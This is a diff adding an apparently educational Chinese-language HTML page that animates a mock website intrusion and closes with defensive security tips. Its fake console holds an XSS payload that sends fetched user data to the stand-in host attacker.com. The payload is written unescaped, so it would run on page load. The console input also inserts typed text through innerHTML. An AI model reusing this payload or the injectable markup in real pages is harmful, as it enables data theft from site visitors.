@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>安全演示 - 前端攻击模拟</title>
+    <style>
+        /* 基础样式定义，替代Tailwind CSS */
+        :root {
+            --hacker-green: #00ff41;
+            --hacker-dark: #0d0208;
+            --hacker-gray: #141414;
+            --purple-400: #c084fc;
+            --yellow-400: #facc15;
+            --red-500: #ef4444;
+            --yellow-500: #eab308;
+            --green-500: #22c55e;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: var(--hacker-dark);
+            color: var(--hacker-green);
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        /* 工具类样式 */
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+        
+        .flex {
+            display: flex;
+        }
+        
+        .flex-col {
+            flex-direction: column;
+        }
+        
+        .items-center {
+            align-items: center;
+        }
+        
+        .justify-between {
+            justify-content: space-between;
+        }
+        
+        .justify-center {
+            justify-content: center;
+        }
+        
+        .space-x-2 > * + * {
+            margin-left: 8px;
+        }
+        
+        .space-x-4 > * + * {
+            margin-left: 16px;
+        }
+        
+        .space-x-6 > * + * {
+            margin-left: 24px;
+        }
+        
+        .space-y-2 > * + * {
+            margin-top: 8px;
+        }
+        
+        .space-y-4 > * + * {
+            margin-top: 16px;
+        }
+        
+        .space-y-6 > * + * {
+            margin-top: 24px;
+        }
+        
+        .mb-1 {
+            margin-bottom: 4px;
+        }
+        
+        .mb-2 {
+            margin-bottom: 8px;
+        }
+        
+        .mb-3 {
+            margin-bottom: 12px;
+        }
+        
+        .mb-4 {
+            margin-bottom: 16px;
+        }
+        
+        .mb-6 {
+            margin-bottom: 24px;
+        }
+        
+        .mb-8 {
+            margin-bottom: 32px;
+        }
+        
+        .mt-8 {
+            margin-top: 32px;
+        }
+        
+        .mr-1 {
+            margin-right: 4px;
+        }
+        
+        .mr-2 {
+            margin-right: 8px;
+        }
+        
+        .mr-3 {
+            margin-right: 12px;
+        }
+        
+        .mr-4 {
+            margin-right: 16px;
+        }
+        
+        .mr-6 {
+            margin-right: 24px;
+        }
+        
+        .mx-4 {
+            margin-left: 16px;
+            margin-right: 16px;
+        }
+        
+        .px-2 {
+            padding-left: 8px;
+            padding-right: 8px;
+        }
+        
+        .px-3 {
+            padding-left: 12px;
+            padding-right: 12px;
+        }
+        
+        .px-4 {
+            padding-left: 16px;
+            padding-right: 16px;
+        }
+        
+        .px-6 {
+            padding-left: 24px;
+            padding-right: 24px;
+        }
+        
+        .py-1 {
+            padding-top: 4px;
+            padding-bottom: 4px;
+        }
+        
+        .py-2 {
+            padding-top: 8px;
+            padding-bottom: 8px;
+        }
+        
+        .py-3 {
+            padding-top: 12px;
+            padding-bottom: 12px;
+        }
+        
+        .py-8 {
+            padding-top: 32px;
+            padding-bottom: 32px;
+        }
+        
+        .p-2 {
+            padding: 8px;
+        }
+        
+        .p-3 {
+            padding: 12px;
+        }
+        
+        .p-4 {
+            padding: 16px;
+        }
+        
+        .rounded {
+            border-radius: 4px;
+        }
+        
+        .rounded-full {
+            border-radius: 50%;
+        }
+        
+        .border {
+            border: 1px solid;
+        }
+        
+        .border-t {
+            border-top: 1px solid;
+        }
+        
+        .border-b {
+            border-bottom: 1px solid;
+        }
+        
+        .border-hacker-green\/50 {
+            border-color: rgba(0, 255, 65, 0.5);
+        }
+        
+        .border-hacker-green\/30 {
+            border-color: rgba(0, 255, 65, 0.3);
+        }
+        
+        .border-yellow-500\/50 {
+            border-color: rgba(234, 179, 8, 0.5);
+        }
+        
+        .bg-hacker-gray {
+            background-color: var(--hacker-gray);
+        }
+        
+        .bg-black {
+            background-color: #000;
+        }
+        
+        .bg-yellow-900\/20 {
+            background-color: rgba(113, 63, 18, 0.2);
+        }
+        
+        .text-2xl {
+            font-size: 1.5rem;
+        }
+        
+        .text-xl {
+            font-size: 1.25rem;
+        }
+        
+        .text-sm {
+            font-size: 0.875rem;
+        }
+        
+        .font-bold {
+            font-weight: bold;
+        }
+        
+        .flex-1 {
+            flex: 1;
+        }
+        
+        .h-1 {
+            height: 4px;
+        }
+        
+        .h-2 {
+            height: 8px;
+        }
+        
+        .h-3 {
+            height: 12px;
+        }
+        
+        .h-8 {
+            height: 32px;
+        }
+        
+        .h-10 {
+            height: 40px;
+        }
+        
+        .h-full {
+            height: 100%;
+        }
+        
+        .h-\[500px\] {
+            height: 500px;
+        }
+        
+        .w-2 {
+            width: 8px;
+        }
+        
+        .w-3 {
+            width: 12px;
+        }
+        
+        .w-8 {
+            width: 32px;
+        }
+        
+        .w-10 {
+            width: 40px;
+        }
+        
+        .w-full {
+            width: 100%;
+        }
+        
+        .overflow-auto {
+            overflow: auto;
+        }
+        
+        .overflow-hidden {
+            overflow: hidden;
+        }
+        
+        .relative {
+            position: relative;
+        }
+        
+        .absolute {
+            position: absolute;
+        }
+        
+        .fixed {
+            position: fixed;
+        }
+        
+        .inset-0 {
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+        }
+        
+        .top-0 {
+            top: 0;
+        }
+        
+        .left-0 {
+            left: 0;
+        }
+        
+        .right-0 {
+            right: 0;
+        }
+        
+        .bottom-0 {
+            bottom: 0;
+        }
+        
+        .z-10 {
+            z-index: 10;
+        }
+        
+        .z-50 {
+            z-index: 50;
+        }
+        
+        .pointer-events-none {
+            pointer-events: none;
+        }
+        
+        .pointer-events-auto {
+            pointer-events: auto;
+        }
+        
+        .list-disc {
+            list-style-type: disc;
+        }
+        
+        .list-inside {
+            list-style-position: inside;
+        }
+        
+        .text-purple-400 {
+            color: var(--purple-400);
+        }
+        
+        .text-yellow-400 {
+            color: var(--yellow-400);
+        }
+        
+        .text-yellow-400\/80 {
+            color: rgba(250, 204, 21, 0.8);
+        }
+        
+        .text-green-400 {
+            color: #4ade80;
+        }
+        
+        .text-red-500 {
+            color: var(--red-500);
+        }
+        
+        .text-yellow-500 {
+            color: var(--yellow-500);
+        }
+        
+        .text-green-500 {
+            color: var(--green-500);
+        }
+        
+        .bg-red-500 {
+            background-color: var(--red-500);
+        }
+        
+        .bg-yellow-500 {
+            background-color: var(--yellow-500);
+        }
+        
+        .bg-green-500 {
+            background-color: var(--green-500);
+        }
+        
+        .bg-hacker-green {
+            background-color: var(--hacker-green);
+        }
+        
+        .text-hacker-dark {
+            color: var(--hacker-dark);
+        }
+        
+        .border-none {
+            border: none;
+        }
+        
+        .focus\:outline-none:focus {
+            outline: none;
+        }
+        
+        .focus\:ring-0:focus {
+            ring: 0;
+        }
+        
+        .grid {
+            display: grid;
+        }
+        
+        .grid-cols-1 {
+            grid-template-columns: repeat(1, minmax(0, 1fr));
+        }
+        
+        @media (min-width: 1024px) {
+            .lg\:col-span-2 {
+                grid-column: span 2 / span 2;
+            }
+            
+            .lg\:grid-cols-3 {
+                grid-template-columns: repeat(3, minmax(0, 1fr));
+            }
+        }
+        
+        .gap-6 {
+            gap: 24px;
+        }
+        
+        .align-middle {
+            vertical-align: middle;
+        }
+        
+        /* 自定义动画和效果 */
+        .text-shadow-green {
+            text-shadow: 0 0 5px var(--hacker-green), 0 0 10px var(--hacker-green);
+        }
+        
+        .border-glow {
+            box-shadow: 0 0 5px var(--hacker-green), 0 0 10px var(--hacker-green);
+        }
+        
+        .bg-grid {
+            background-size: 40px 40px;
+            background-image: 
+                linear-gradient(to right, rgba(0, 255, 65, 0.1) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(0, 255, 65, 0.1) 1px, transparent 1px);
+        }
+        
+        .scanline {
+            background: linear-gradient(to bottom, 
+                transparent 50%, 
+                rgba(0, 255, 65, 0.1) 50%);
+            background-size: 100% 4px;
+            animation: scan 6s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+        
+        .typing {
+            overflow: hidden;
+            border-right: 2px solid var(--hacker-green);
+            white-space: nowrap;
+            margin: 0;
+            animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
+        }
+        
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+        
+        @keyframes blink-caret {
+            from, to { border-color: transparent }
+            50% { border-color: var(--hacker-green) }
+        }
+        
+        .fade-in {
+            animation: fadeIn 1s ease-in forwards;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .transition-opacity {
+            transition: opacity 0.5s ease;
+        }
+        
+        .transition-colors {
+            transition: color 0.3s ease, background-color 0.3s ease;
+        }
+        
+        .hover\:bg-hacker-green:hover {
+            background-color: var(--hacker-green);
+        }
+        
+        .hover\:text-hacker-dark:hover {
+            color: var(--hacker-dark);
+        }
+        
+        .hover\:bg-hacker-green\/10:hover {
+            background-color: rgba(0, 255, 65, 0.1);
+        }
+        
+        .transition {
+            transition: all 0.2s ease;
+        }
+    </style>
+</head>
+<body class="bg-hacker-dark text-hacker-green font-mono min-h-screen overflow-x-hidden bg-grid relative">
+    <!-- 扫描线效果 -->
+    <div class="scanline fixed top-0 left-0 w-full h-full pointer-events-none z-50"></div>
+    
+    <!-- 顶部导航 -->
+    <nav class="border-b border-hacker-green/50 py-2 px-4 flex justify-between items-center relative z-10">
+        <div class="flex items-center">
+            <span class="text-2xl mr-2">🔒</span>
+            <span class="text-xl font-bold text-shadow-green">渗透测试系统</span>
+        </div>
+        <div class="flex items-center space-x-4">
+            <span id="status">状态: 监控中</span>
+            <div class="w-2 h-2 rounded-full bg-hacker-green pulse"></div>
+        </div>
+    </nav>
+    
+    <!-- 主内容区 -->
+    <main class="container mx-auto px-4 py-8 relative z-10">
+        <!-- 阶段指示器 -->
+        <div class="mb-8 flex justify-between items-center">
+            <div class="flex items-center">
+                <div class="w-8 h-8 rounded-full bg-hacker-green text-hacker-dark flex items-center justify-center font-bold mr-2">1</div>
+                <span>初始扫描</span>
+            </div>
+            <div class="flex-1 mx-4 h-1 bg-hacker-green/30">
+                <div id="progress-1" class="h-full bg-hacker-green w-full"></div>
+            </div>
+            <div class="flex items-center">
+                <div class="w-8 h-8 rounded-full border border-hacker-green flex items-center justify-center font-bold mr-2" id="stage-2">2</div>
+                <span>漏洞识别</span>
+            </div>
+            <div class="flex-1 mx-4 h-1 bg-hacker-green/30">
+                <div id="progress-2" class="h-full bg-hacker-green w-0"></div>
+            </div>
+            <div class="flex items-center">
+                <div class="w-8 h-8 rounded-full border border-hacker-green flex items-center justify-center font-bold mr-2" id="stage-3">3</div>
+                <span>代码注入</span>
+            </div>
+            <div class="flex-1 mx-4 h-1 bg-hacker-green/30">
+                <div id="progress-3" class="h-full bg-hacker-green w-0"></div>
+            </div>
+            <div class="flex items-center">
+                <div class="w-8 h-8 rounded-full border border-hacker-green flex items-center justify-center font-bold mr-2" id="stage-4">4</div>
+                <span>获取数据</span>
+            </div>
+        </div>
+        
+        <!-- 屏幕区域 -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- 左侧：目标网站 -->
+            <div class="lg:col-span-2">
+                <div class="border border-hacker-green/50 rounded-md mb-4">
+                    <div class="bg-hacker-gray border-b border-hacker-green/50 px-4 py-2 flex items-center">
+                        <div class="flex space-x-2 mr-4">
+                            <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                        </div>
+                        <span>目标网站: ********</span>
+                    </div>
+                    <div id="target-website" class="h-[500px] overflow-auto p-4 bg-black relative">
+                        <!-- 初始页面内容 -->
+                        <div id="github-page" class="opacity-100 transition-opacity duration-500">
+                            <div class="flex items-center mb-6">
+                                <!-- 用文本替代GitHub图标 -->
+                                <div class="w-10 h-10 bg-white text-black flex items-center justify-center font-bold mr-3">GH</div>
+                                <h1 class="text-2xl font-bold">sample-project</h1>
+                            </div>
+                            
+                            <div class="mb-6">
+                                <div class="flex space-x-4 mb-3">
+                                    <button class="border border-hacker-green/50 px-3 py-1 rounded hover:bg-hacker-green/10 transition">
+                                        🔀 Fork
+                                    </button>
+                                    <button class="border border-hacker-green/50 px-3 py-1 rounded hover:bg-hacker-green/10 transition">
+                                        ★ Star
+                                    </button>
+                                    <button class="border border-hacker-green/50 px-3 py-1 rounded hover:bg-hacker-green/10 transition">
+                                        👁️ Watch
+                                    </button>
+                                </div>
+                                
+                                <div class="text-sm mb-4">
+                                    <p>A secure web application repository with sensitive data</p>
+                                </div>
+                                
+                                <div class="flex space-x-6 text-sm">
+                                    <div>💻 JavaScript</div>
+                                    <div>📅 Updated 2 days ago</div>
+                                </div>
+                            </div>
+                            
+                            <div class="border-t border-hacker-green/30 pt-4">
+                                <h2 class="text-xl mb-3">Files</h2>
+                                <div class="space-y-2">
+                                    <div class="flex items-center">
+                                        <span class="mr-2">📁</span>
+                                        <span>src/</span>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <span class="mr-2">📄</span>
+                                        <span>app.js</span>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <span class="mr-2">📄</span>
+                                        <span>config.js</span>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <span class="mr-2">📄</span>
+                                        <span>README.md</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- 攻击效果覆盖层 -->
+                        <div id="attack-overlay" class="absolute inset-0 bg-black opacity-0 pointer-events-none transition-opacity duration-1000 flex items-center justify-center">
+                            <div class="text-center">
+                                <div class="text-5xl mb-6 pulse">
+                                    ⚠️
+                                </div>
+                                <h2 class="text-2xl mb-4 typing">UNAUTHORIZED ACCESS DETECTED</h2>
+                                <p class="mb-6">系统已被入侵，敏感数据泄露</p>
+                                <button id="reveal-data" class="border border-hacker-green px-6 py-2 rounded hover:bg-hacker-green hover:text-hacker-dark transition-colors duration-300 font-bold">
+                                    查看泄露数据
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- 泄露的数据 -->
+                        <div id="leaked-data" class="absolute inset-0 bg-black opacity-0 pointer-events-none transition-opacity duration-1000 p-4 overflow-auto">
+                            <div class="mb-4">
+                                <h2 class="text-xl mb-2">泄露的敏感数据</h2>
+                                <div class="border border-hacker-green/50 p-3 mb-4">
+                                    <p class="mb-2"><strong>数据库凭证:</strong></p>
+                                    <p>Username: admin_user</p>
+                                    <p>Password: SecurePass123!</p>
+                                    <p>Host: ************</p>
+                                </div>
+                                
+                                <div class="border border-hacker-green/50 p-3 mb-4">
+                                    <p class="mb-2"><strong>用户数据:</strong></p>
+                                    <p>admin@example.com - 管理员权限</p>
+                                    <p>user1@example.com - 普通用户</p>
+                                    <p>user2@example.com - 普通用户</p>
+                                </div>
+                                
+                                <div class="border border-hacker-green/50 p-3">
+                                    <p class="mb-2"><strong>API 密钥:</strong></p>
+                                    <p>GitHub API: ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</p>
+                                    <p>支付网关: pk_test_XXXXXXXXXXXXXXXXXXXXXXXX</p>
+                                </div>
+                            </div>
+                            
+                            <button id="reset-demo" class="border border-hacker-green px-6 py-2 rounded hover:bg-hacker-green hover:text-hacker-dark transition-colors duration-300 font-bold">
+                                重置演示
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 右侧：黑客控制台 -->
+            <div>
+                <div class="border border-hacker-green/50 rounded-md h-[500px] flex flex-col">
+                    <div class="bg-hacker-gray border-b border-hacker-green/50 px-4 py-2 flex items-center">
+                        <div class="flex space-x-2 mr-4">
+                            <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                        </div>
+                        <span>黑客控制台</span>
+                    </div>
+                    <div id="console-output" class="flex-1 overflow-auto p-4 bg-black text-sm">
+                        <div class="mb-1 opacity-0" id="console-line-1">
+                            <span class="text-purple-400">root@hacker:~#</span> nmap ********
+                        </div>
+                        <div class="mb-1 opacity-0 ml-4" id="console-line-2">
+                            正在扫描目标...
+                        </div>
+                        <div class="mb-1 opacity-0 ml-4" id="console-line-3">
+                            发现开放端口: 80, 443, 3000
+                        </div>
+                        <div class="mb-1 opacity-0" id="console-line-4">
+                            <span class="text-purple-400">root@hacker:~#</span> dirb https://********
+                        </div>
+                        <div class="mb-1 opacity-0 ml-4" id="console-line-5">
+                            枚举目录和文件...
+                        </div>
+                        <div class="mb-1 opacity-0 ml-4" id="console-line-6">
+                            发现敏感文件: /config.js, /api/keys
+                        </div>
+                        <div class="mb-1 opacity-0" id="console-line-7">
+                            <span class="text-purple-400">root@hacker:~#</span> 执行 XSS 注入攻击
+                        </div>
+                        <div class="mb-1 opacity-0 ml-4" id="console-line-8">
+                            注入代码: <script>fetch('/api/userdata').then(r=>r.json()).then(d=>fetch('http://attacker.com/log?d='+JSON.stringify(d)))</script>
+                        </div>
+                        <div class="mb-1 opacity-0 ml-4" id="console-line-9">
+                            攻击成功! 正在接收数据...
+                        </div>
+                        <div class="mb-1 opacity-0" id="console-line-10">
+                            <span class="text-purple-400">root@hacker:~#</span> 解析获取的数据
+                        </div>
+                        <div class="mb-1 opacity-0 ml-4" id="console-line-11">
+                            提取数据库凭证和用户信息...
+                        </div>
+                        <div class="mb-1 opacity-0 text-yellow-400" id="console-line-12">
+                            [!] 发现管理员账户凭证
+                        </div>
+                        <div class="mb-1 opacity-0 text-green-400" id="console-line-13">
+                            [+] 入侵完成，获取所有敏感数据
+                        </div>
+                    </div>
+                    <div class="border-t border-hacker-green/50 p-2">
+                        <div class="flex">
+                            <span class="text-purple-400 mr-2">root@hacker:~#</span>
+                            <input type="text" id="console-input" class="bg-transparent border-none focus:outline-none focus:ring-0 flex-1" placeholder="输入命令...">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- 安全提示 -->
+        <div class="mt-8 p-4 border border-yellow-500/50 bg-yellow-900/20 rounded-md">
+            <h3 class="text-yellow-400 font-bold mb-2 flex items-center">
+                <span class="mr-2">ℹ️</span> 安全提示
+            </h3>
+            <ul class="list-disc list-inside text-yellow-400/80 space-y-1 text-sm">
+                <li>实施内容安全策略 (CSP) 防止XSS攻击</li>
+                <li>对用户输入进行严格验证和过滤</li>
+                <li>使用HTTPS加密传输数据</li>
+                <li>定期更新依赖包，修复已知漏洞</li>
+                <li>实施适当的访问控制和权限管理</li>
+            </ul>
+        </div>
+    </main>
+    
+    <script>
+        // 演示流程控制
+        document.addEventListener('DOMContentLoaded', () => {
+            // 阶段1：初始扫描
+            let delay = 500;
+            for (let i = 1; i <= 3; i++) {
+                setTimeout(() => {
+                    document.getElementById(`console-line-${i}`).classList.add('fade-in');
+                    document.getElementById(`console-line-${i}`).style.opacity = 1;
+                }, delay);
+                delay += 1000;
+            }
+            
+            // 完成阶段1，进入阶段2
+            setTimeout(() => {
+                document.getElementById('stage-2').classList.add('bg-hacker-green', 'text-hacker-dark');
+                document.getElementById('progress-2').style.width = '0%';
+                
+                // 阶段2：漏洞识别
+                for (let i = 4; i <= 6; i++) {
+                    setTimeout(() => {
+                        document.getElementById(`console-line-${i}`).classList.add('fade-in');
+                        document.getElementById(`console-line-${i}`).style.opacity = 1;
+                    }, delay);
+                    delay += 1000;
+                }
+                
+                // 进度条动画
+                let progress = 0;
+                const progressInterval = setInterval(() => {
+                    progress += 1;
+                    document.getElementById('progress-2').style.width = `${progress}%`;
+                    if (progress >= 100) clearInterval(progressInterval);
+                }, 50);
+                
+                // 完成阶段2，进入阶段3
+                setTimeout(() => {
+                    document.getElementById('stage-3').classList.add('bg-hacker-green', 'text-hacker-dark');
+                    document.getElementById('progress-3').style.width = '0%';
+                    
+                    // 阶段3：代码注入
+                    for (let i = 7; i <= 9; i++) {
+                        setTimeout(() => {
+                            document.getElementById(`console-line-${i}`).classList.add('fade-in');
+                            document.getElementById(`console-line-${i}`).style.opacity = 1;
+                        }, delay);
+                        delay += 1500;
+                    }
+                    
+                    // 进度条动画
+                    let progress3 = 0;
+                    const progressInterval3 = setInterval(() => {
+                        progress3 += 1;
+                        document.getElementById('progress-3').style.width = `${progress3}%`;
+                        if (progress3 >= 100) clearInterval(progressInterval3);
+                    }, 50);
+                    
+                    // 完成阶段3，进入阶段4
+                    setTimeout(() => {
+                        document.getElementById('stage-4').classList.add('bg-hacker-green', 'text-hacker-dark');
+                        
+                        // 阶段4：获取数据
+                        for (let i = 10; i <= 13; i++) {
+                            setTimeout(() => {
+                                document.getElementById(`console-line-${i}`).classList.add('fade-in');
+                                document.getElementById(`console-line-${i}`).style.opacity = 1;
+                            }, delay);
+                            delay += 1000;
+                        }
+                        
+                        // 显示攻击成功界面
+                        setTimeout(() => {
+                            document.getElementById('github-page').style.opacity = 0.2;
+                            document.getElementById('attack-overlay').style.opacity = 1;
+                            document.getElementById('attack-overlay').style.pointerEvents = 'auto';
+                            document.getElementById('status').textContent = '状态: 入侵成功';
+                        }, delay + 1000);
+                    }, 4500); // 阶段3持续时间
+                }, 3000); // 阶段2持续时间
+            }, 3000); // 阶段1持续时间
+            
+            // 交互：显示泄露数据
+            document.getElementById('reveal-data').addEventListener('click', () => {
+                document.getElementById('attack-overlay').style.opacity = 0;
+                document.getElementById('attack-overlay').style.pointerEvents = 'none';
+                document.getElementById('leaked-data').style.opacity = 1;
+                document.getElementById('leaked-data').style.pointerEvents = 'auto';
+            });
+            
+            // 交互：重置演示
+            document.getElementById('reset-demo').addEventListener('click', () => {
+                location.reload();
+            });
+            
+            // 控制台输入交互
+            const consoleInput = document.getElementById('console-input');
+            consoleInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    const command = consoleInput.value.trim();
+                    if (command) {
+                        const consoleOutput = document.getElementById('console-output');
+                        const newLine = document.createElement('div');
+                        newLine.className = 'mb-1';
+                        newLine.innerHTML = `<span class="text-purple-400">root@hacker:~#</span> ${command}`;
+                        consoleOutput.appendChild(newLine);
+                        
+                        // 模拟命令输出
+                        const responseLine = document.createElement('div');
+                        responseLine.className = 'mb-1 ml-4';
+                        
+                        if (command.includes('help')) {
+                            responseLine.textContent = '可用命令: scan, exploit, download, exit';
+                        } else if (command.includes('exploit')) {
+                            responseLine.innerHTML = '<span class="text-green-400">正在执行漏洞利用...</span>';
+                        } else if (command.includes('download')) {
+                            responseLine.innerHTML = '<span class="text-green-400">正在下载敏感数据...</span>';
+                        } else {
+                            responseLine.textContent = `命令 "${command}" 已执行`;
+                        }
+                        
+                        consoleOutput.appendChild(responseLine);
+                        consoleOutput.scrollTop = consoleOutput.scrollHeight;
+                    }
+                    consoleInput.value = '';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
